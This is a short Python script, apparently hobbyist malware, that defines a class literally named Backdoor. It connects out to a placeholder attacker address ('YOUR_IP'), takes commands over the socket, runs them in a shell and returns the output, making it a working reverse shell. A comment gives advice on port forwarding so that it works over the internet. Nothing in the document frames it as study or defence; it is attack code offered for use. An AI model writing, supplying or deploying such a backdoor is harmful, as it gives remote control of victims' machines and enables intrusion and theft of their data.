    import socket
    import subprocess
    import getpass
    import sys
    import json
     
    class Backdoor():
        def __init__(self, ip, port) -> None:
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.connect((ip, port))
     
        def reliable_send(self, data):
            print(data)
            json_data = json.dumps(data)
            print(json_data)
            self.connection.send(json_data.encode('utf-8'))
     
        def reliable_receive(self):
            json_data = self.connection.recv(4096).decode('utf-8') #decoding byte like object into readable stuff
            return json.loads(json_data)
     
        def execute_system_commands(self, command):
            return subprocess.check_output(command, shell=True)
     
        def run(self):
            while True:
                command = self.reliable_receive()
                command_result = self.execute_system_commands(command)
                self.reliable_send(data=command_result.decode('utf-8'))
            connection.close()
     
    my_backdoor = Backdoor('YOUR_IP', "Port"); #Works also with public ip you should enable port forwarding in your router
    my_backdoor.run()
